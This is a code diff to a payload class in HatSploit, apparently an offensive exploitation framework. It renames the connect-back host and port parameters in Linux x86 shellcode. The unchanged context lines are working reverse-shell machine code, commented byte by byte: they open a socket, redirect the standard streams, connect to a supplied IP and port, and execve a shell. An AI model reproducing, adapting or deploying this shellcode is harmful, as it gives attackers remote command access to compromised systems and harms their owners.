@@ -24,8 +24,8 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        connback_host = self.handler['CBHOST']
-        connback_port = self.handler['CBPORT']
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
         return (
             b"\x31\xdb"              # xor ebx,ebx
@@ -43,9 +43,9 @@ class HatSploitPayload(Payload):
             b"\xcd\x80"              # int 0x80
             b"\x49"                  # dec ecx
             b"\x79\xf9"              # jns 0x11
-            b"\x68:cbhost:ip:"        # push ip addr
+            b"\x68:rhost:ip:"        # push ip addr
             b"\x68\x02\x00"          # push port
-            b":cbport:port:"
+            b":rport:port:"
             b"\x89\xe1"              # mov ecx,esp
             b"\xb0\x66"              # mov al,0x66 (sys_socketcall)
             b"\x50"                  # push eax
@@ -64,6 +64,6 @@ class HatSploitPayload(Payload):
             b"\xb0\x0b"              # mov al,0xb (execve)
             b"\xcd\x80"              # int 0x80
         ), {
-            'cbhost': connback_host,
-            'cbport': connback_port
+            'rhost': remote_host,
+            'rport': remote_port
         }
